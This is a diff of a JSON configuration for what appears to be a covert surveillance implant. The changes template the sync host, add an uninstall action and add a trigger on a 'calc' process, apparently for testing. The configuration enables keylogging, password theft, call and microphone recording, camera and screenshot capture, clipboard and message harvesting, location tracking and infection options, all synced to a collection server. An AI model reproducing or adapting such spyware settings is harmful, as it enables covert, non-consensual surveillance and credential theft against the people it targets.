@@ -4,7 +4,7 @@
         {
             "subactions": [
                 {
-                    "host": "rcs-castore",
+                    "host": "$(HOSTNAME)",
                     "stop": false,
                     "cell": false,
                     "mindelay": 0,
@@ -15,37 +15,48 @@
                 }
             ],
             "desc": "SYNC"
-        }
+        },
+        {"subactions": [{"action": "uninstall"}], "desc": ""}
     ],
     "events": [
         {
             "event": "timer",
             "start": 0,
             "subtype": "loop",
-            "desc": "STARTUP",
+            "enabled": true,
             "ts": "00:00:00",
-            "te": "23:59:59",
-            "enabled": true
+            "desc": "STARTUP",
+            "te": "23:59:59"
         },
         {
+            "repeat": 1,
             "event": "timer",
             "subtype": "loop",
-            "desc": "SYNC",
+            "enabled": true,
             "ts": "00:00:00",
-            "repeat": 1,
+            "desc": "SYNC",
             "te": "23:59:59",
-            "delay": 600,
-            "enabled": true
+            "start": 1,
+            "delay": 600
+        },
+        {
+            "event": "process",
+            "start": 2,
+            "enabled": true,
+            "desc": "",
+            "window": false,
+            "process": "*calc*",
+            "focus": false
         }
     ],
     "globals": {
-        "migrated": false,
+        "advanced": true,
         "collapsed": false,
         "nohide": [],
-        "advanced": false,
+        "quota": {"min": 1048576000, "max": 4194304000},
+        "migrated": false,
         "type": "desktop",
         "wipe": false,
-        "quota": {"min": 1048576000, "max": 4194304000},
         "version": 2012041601,
         "remove_driver": true
     },
@@ -53,7 +64,7 @@
         {"module": "addressbook"},
         {"module": "application"},
         {"module": "calendar"},
-        {"record": true, "module": "call", "buffer": 512000, "compression": 5},
+        {"module": "call", "buffer": 512000, "record": true, "compression": 5},
         {"module": "camera", "quality": "med"},
         {"module": "chat"},
         {"module": "clipboard"},
@@ -61,8 +72,8 @@
             "mic": true,
             "position": true,
             "network": {"processes": [], "enabled": false},
-            "module": "crisis",
             "call": true,
+            "module": "crisis",
             "hook": {"processes": [], "enabled": true},
             "camera": true,
             "synchronize": false
@@ -70,41 +81,41 @@
         {"list": false, "module": "device"},
         {
             "deny": [],
-            "module": "file",
             "accept": [],
             "minsize": 1,
             "capture": false,
+            "module": "file",
             "maxsize": 500000,
             "date": "2013-02-15 00:00:00",
             "open": false
         },
-        {"factory": "", "usb": false, "local": false, "vm": 0, "module": "infection", "mobile": false},
+        {"factory": "", "usb": false, "vm": 0, "module": "infection", "mobile": false, "local": false},
         {"module": "keylog"},
         {
-            "sms": {
-                "filter": {"history": true, "datefrom": "2013-02-15 00:00:00", "dateto": "2100-01-01 00:00:00"},
-                "enabled": true
-            },
             "mail": {
                 "filter": {
-                    "history": true,
                     "datefrom": "2013-02-15 00:00:00",
                     "maxsize": 100000,
+                    "history": true,
                     "dateto": "2100-01-01 00:00:00"
                 },
                 "enabled": true
             },
             "mms": {
-                "filter": {"history": true, "datefrom": "2013-02-15 00:00:00", "dateto": "2100-01-01 00:00:00"},
+                "filter": {"datefrom": "2013-02-15 00:00:00", "history": true, "dateto": "2100-01-01 00:00:00"},
                 "enabled": true
             },
-            "module": "messages"
+            "module": "messages",
+            "sms": {
+                "filter": {"datefrom": "2013-02-15 00:00:00", "history": true, "dateto": "2100-01-01 00:00:00"},
+                "enabled": true
+            }
         },
         {"autosense": false, "threshold": 0.22, "module": "mic", "silence": 5},
         {"height": 50, "module": "mouse", "width": 50},
         {"module": "password"},
         {"gps": false, "module": "position", "cell": true, "wifi": true},
-        {"quality": "med", "module": "screenshot", "onlywindow": false},
+        {"module": "screenshot", "quality": "med", "onlywindow": false},
         {"module": "url"}
     ]
 }
